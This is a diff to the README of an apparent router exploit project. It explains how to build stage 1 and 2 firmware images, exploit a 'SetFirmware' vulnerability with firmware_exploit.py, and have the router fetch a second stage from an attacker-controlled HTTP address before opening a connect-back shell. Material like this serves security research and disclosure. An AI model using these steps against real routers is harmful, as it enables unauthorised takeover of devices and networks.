@@ -37,13 +37,13 @@ The mtd writer is responsible for flashing the stage 2 firmware image. I have mo
 
 You'll also need a little endian MIPS gcc toolchain. Ensure ``mipsel-linux-gcc`` and friends are in your ``$PATH``.
 
-With the missing pieces in place, you can build the stage 1 firmware:
+With the missing pieces in place, you can build the stage 1 and 2 firmware images:
 
     $ cd exploit-src/
     $ ./buildmipsel.sh
 
-With this update, assuming you've generated a working, minimized firmware, you should be able to exploit the ``SetFirmware`` vulnerability, and flash your firmware image to the router:
+With this update, assuming you've generated a working, minimized firmware, you should be able to exploit the ``SetFirmware`` vulnerability, and flash your firmware image to the router. Edit environment.py and specify the appropriate connect-back ports, target IP address and port, names of stage 1 and 2 files, and the directory to serve them out of. Then run:
 
-``./setfirmware.py <stage_1_firmware.bin>``
+``./firmware_exploit.py``
 
-Upon rebooting, the stage 1 firmware will attempt to download the second stage from ``http://10.12.34.56:8080/stage2mtd.bin``
+Upon rebooting, the stage 1 firmware will attempt to download the second stage from ``http://10.12.34.56:8080/stage2mtd.bin``. Then, if all goes well, there is a second reboot and then a connect-back shell to the IP address and port you specified in the ``telnetenabled`` script.
